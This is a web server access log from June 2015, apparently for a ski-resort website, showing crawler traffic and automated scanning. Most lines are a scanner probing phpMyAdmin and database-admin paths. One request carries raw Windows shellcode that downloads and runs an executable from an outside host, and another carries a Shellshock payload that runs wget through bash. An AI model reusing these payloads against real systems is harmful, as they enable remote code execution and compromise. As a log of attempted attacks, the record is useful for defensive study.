159.253.149.155 - - [05/Jun/2015:04:55:10 -0700] "HEAD http://54.245.232.47:80/sql/sqladmin/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
159.253.149.155 - - [05/Jun/2015:04:55:10 -0700] "HEAD http://54.245.232.47:80/sql/sqlweb/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
159.253.149.155 - - [05/Jun/2015:04:55:11 -0700] "HEAD http://54.245.232.47:80/sql/webadmin/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
159.253.149.155 - - [05/Jun/2015:04:55:11 -0700] "HEAD http://54.245.232.47:80/sql/webdb/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
159.253.149.155 - - [05/Jun/2015:04:55:11 -0700] "HEAD http://54.245.232.47:80/sql/websql/ HTTP/1.1" 404 182 "-" "Mozilla/5.0 Jorgee"
123.125.71.97 - - [05/Jun/2015:05:03:40 -0700] "-" 408 0 "-" "-"
66.249.79.14 - - [05/Jun/2015:05:04:58 -0700] "GET /resorts?resort=pomerelle&date=2012-12-22 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.181.108.101 - - [05/Jun/2015:05:07:24 -0700] "-" 408 0 "-" "-"
180.225.203.220 - - [05/Jun/2015:05:07:49 -0700] "POST /OvCgi/getnnmdata.exe HTTP/1.1" 404 481 "-" "T00WT00W3\xc9d\x8bA0\x8b@\x0c\x8bp\x14\xad\x96\xad\x8bX\x10\x8bS<\x03\xd3\x8bRx\x03\xd3\x8br \x03\xf33\xc9A\xad\x03\xc3\x818GetPu\xf4\x81x\x04rocAu\xeb\x81x\bddreu\xe2\x8br$\x03\xf3f\x8b\x0cNI\x8br\x1c\x03\xf3\x8b\x14\x8e\x03\xd33\xc9Qh.exehdeadSRQharyAhLibrhLoadTS\xff\xd2\x83\xc4\x0cYPQf\xb9llQhon.dhurlmT\xff\xd0\x83\xc4\x10\x8bT$\x043\xc9Qf\xb9eAQ3\xc9hoFilhoadThownlhURLDTP\xff\xd23\xc9\x8dT$$QQR\xebGQ\xff\xd0\x83\xc4\x1c3\xc9Z[SRQhxeca\x88L$\x03hWinETS\xff\xd2j\x05\x8dL$\x18Q\xff\xd0\x83\xc4\x0cZ[hessa\x83l$\x03ahProchExitTS\xff\xd2\xff\xd0\xe8\xb4\xff\xff\xffhttp://66.186.188.227:88/getips.exe"
212.227.88.210 - - [05/Jun/2015:05:14:39 -0700] "HEAD http://54.245.232.47:80/1phpmyadmin/ HTTP/1.1" 404 219 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:39 -0700] "HEAD http://54.245.232.47:80/2phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:40 -0700] "HEAD http://54.245.232.47:80/3phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:40 -0700] "HEAD http://54.245.232.47:80/4phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:40 -0700] "HEAD http://54.245.232.47:80/MyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:40 -0700] "HEAD http://54.245.232.47:80/PMA/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:40 -0700] "HEAD http://54.245.232.47:80/PMA2011/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/PMA2012/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/PMA2013/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/PMA2014/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/PMA2015/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:41 -0700] "HEAD http://54.245.232.47:80/admin/db/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/pMA/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/phpMyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/sqladmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/sysadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:42 -0700] "HEAD http://54.245.232.47:80/admin/web/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:43 -0700] "HEAD http://54.245.232.47:80/administrator/PMA/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:43 -0700] "HEAD http://54.245.232.47:80/administrator/admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:43 -0700] "HEAD http://54.245.232.47:80/administrator/db/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:43 -0700] "HEAD http://54.245.232.47:80/administrator/phpMyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:43 -0700] "HEAD http://54.245.232.47:80/administrator/phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/administrator/pma/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/administrator/web/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/database/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/db/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/db/db-admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:44 -0700] "HEAD http://54.245.232.47:80/db/dbadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/dbweb/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/myadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/phpMyAdmin-3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/phpMyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/phpMyAdmin3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:45 -0700] "HEAD http://54.245.232.47:80/db/phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:46 -0700] "HEAD http://54.245.232.47:80/db/phpmyadmin3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:46 -0700] "HEAD http://54.245.232.47:80/db/webadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:46 -0700] "HEAD http://54.245.232.47:80/db/webdb/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:46 -0700] "HEAD http://54.245.232.47:80/db/websql/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:46 -0700] "HEAD http://54.245.232.47:80/dbadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/myadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/myadminphp/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/mysql-admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/mysql/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/mysql/admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:47 -0700] "HEAD http://54.245.232.47:80/mysql/db/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/dbadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/mysqlmanager/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/pMA/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/pma/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/sqlmanager/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:48 -0700] "HEAD http://54.245.232.47:80/mysql/web/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:49 -0700] "HEAD http://54.245.232.47:80/mysqladmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:49 -0700] "HEAD http://54.245.232.47:80/mysqlmanager/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:49 -0700] "HEAD http://54.245.232.47:80/php-my-admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:49 -0700] "HEAD http://54.245.232.47:80/php-myadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:49 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin-2/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin-3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin-4/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
66.249.75.40 - - [05/Jun/2015:05:14:50 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
66.249.75.56 - - [05/Jun/2015:05:14:50 -0700] "GET /resorts?resort=moonlightbasin&date=2014-02-09 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin2/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:50 -0700] "HEAD http://54.245.232.47:80/phpMyAdmin4/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:51 -0700] "HEAD http://54.245.232.47:80/phpMyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:51 -0700] "HEAD http://54.245.232.47:80/phpmanager/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:51 -0700] "HEAD http://54.245.232.47:80/phpmy-admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:51 -0700] "HEAD http://54.245.232.47:80/phpmy/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:51 -0700] "HEAD http://54.245.232.47:80/phpmyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phpmyadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phpmyadmin1/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phpmyadmin2/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phpmyadmin3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phpmyadmin4/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:52 -0700] "HEAD http://54.245.232.47:80/phppma/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:53 -0700] "HEAD http://54.245.232.47:80/pma/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:53 -0700] "HEAD http://54.245.232.47:80/pma2011/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:53 -0700] "HEAD http://54.245.232.47:80/pma2012/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:53 -0700] "HEAD http://54.245.232.47:80/pma2013/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:53 -0700] "HEAD http://54.245.232.47:80/pma2014/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/pma2015/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/program/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/shopdb/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/sql/myadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/sql/php-myadmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:54 -0700] "HEAD http://54.245.232.47:80/sql/phpMyAdmin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:55 -0700] "HEAD http://54.245.232.47:80/sql/phpMyAdmin2/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:55 -0700] "HEAD http://54.245.232.47:80/sql/phpMyAdmin3/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:55 -0700] "HEAD http://54.245.232.47:80/sql/phpMyAdmin4/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:55 -0700] "HEAD http://54.245.232.47:80/sql/phpmanager/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:55 -0700] "HEAD http://54.245.232.47:80/sql/phpmy-admin/ HTTP/1.1" 404 218 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/phpmyadmin2/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/phpmyadmin3/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/phpmyadmin4/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/sql-admin/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/sql/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:56 -0700] "HEAD http://54.245.232.47:80/sql/sqladmin/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:57 -0700] "HEAD http://54.245.232.47:80/sql/sqlweb/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:57 -0700] "HEAD http://54.245.232.47:80/sql/webadmin/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:57 -0700] "HEAD http://54.245.232.47:80/sql/webdb/ HTTP/1.1" 404 217 "-" "Mozilla/5.0 Jorgee"
212.227.88.210 - - [05/Jun/2015:05:14:57 -0700] "HEAD http://54.245.232.47:80/sql/websql/ HTTP/1.1" 404 182 "-" "Mozilla/5.0 Jorgee"
170.75.162.130 - - [05/Jun/2015:05:16:37 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1017 "-" "node-superagent/0.18.2"
12.207.10.188 - - [05/Jun/2015:05:23:57 -0700] "GET / HTTP/1.0" 200 6151 "() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=35342e3234352e3233322e3437\"" "() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=35342e3234352e3233322e3437\""
66.249.75.48 - - [05/Jun/2015:05:24:42 -0700] "GET /resorts?resort=cascademountain&date=2014-02-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:05:34:33 -0700] "GET /resorts?resort=aspenmountain&date=2014-02-01 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.56 - - [05/Jun/2015:05:44:25 -0700] "GET /resorts?resort=snowbird&date=2014-02-19 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.40 - - [05/Jun/2015:05:54:17 -0700] "GET /resorts?resort=boyne&date=2013-12-19 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:06:04:09 -0700] "GET /resorts?resort=coppermountain&date=2014-02-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.34 - - [05/Jun/2015:06:06:33 -0700] "-" 408 0 "-" "-"
220.181.108.76 - - [05/Jun/2015:06:10:25 -0700] "-" 408 0 "-" "-"
66.249.75.48 - - [05/Jun/2015:06:14:01 -0700] "GET /resorts?resort=whitefishmountain&date=2013-12-29 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:06:23:53 -0700] "GET /resorts?resort=redriver&date=2014-02-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
74.218.246.186 - - [05/Jun/2015:06:23:59 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
66.249.75.48 - - [05/Jun/2015:06:33:45 -0700] "GET /resorts?resort=porcupine&date=2013-12-29 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:06:43:37 -0700] "GET /resorts?resort=windham&date=2014-02-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.56 - - [05/Jun/2015:06:53:29 -0700] "GET /resorts?resort=bigsky&date=2014-01-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.92 - - [05/Jun/2015:06:55:30 -0700] "-" 408 0 "-" "-"
220.181.108.101 - - [05/Jun/2015:06:57:56 -0700] "-" 408 0 "-" "-"
180.76.15.150 - - [05/Jun/2015:07:01:48 -0700] "GET /resorts?resort=snowbird&date=2014-02-15 HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.75.40 - - [05/Jun/2015:07:03:21 -0700] "GET /resorts?resort=snowbird&date=2014-01-29 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.249.90.202 - - [05/Jun/2015:07:03:39 -0700] "GET /robots.txt HTTP/1.0" 200 382 "-" "maluuba-crawler/Nutch-1.6"
162.249.90.202 - - [05/Jun/2015:07:03:39 -0700] "GET / HTTP/1.0" 200 2339 "-" "maluuba-crawler/Nutch-1.6"
66.249.75.48 - - [05/Jun/2015:07:13:13 -0700] "GET /resorts?resort=schweitzer&date=2014-01-03 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.40 - - [05/Jun/2015:07:23:05 -0700] "GET /resorts?resort=bigsky&date=2013-12-31 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:07:27:29 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 990 "-" "node-superagent/0.18.2"
71.177.63.28 - - [05/Jun/2015:07:32:21 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
66.249.75.56 - - [05/Jun/2015:07:32:57 -0700] "GET /resorts?resort=silvermountain&date=2014-01-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:07:34:49 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 922 "-" "node-superagent/0.18.2"
66.249.75.40 - - [05/Jun/2015:07:42:49 -0700] "GET /resorts?resort=arapahoebasin&date=2014-02-03 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.154.56.5 - - [05/Jun/2015:07:48:47 -0700] "GET / HTTP/1.0" 200 6151 "-" "NerdyBot"
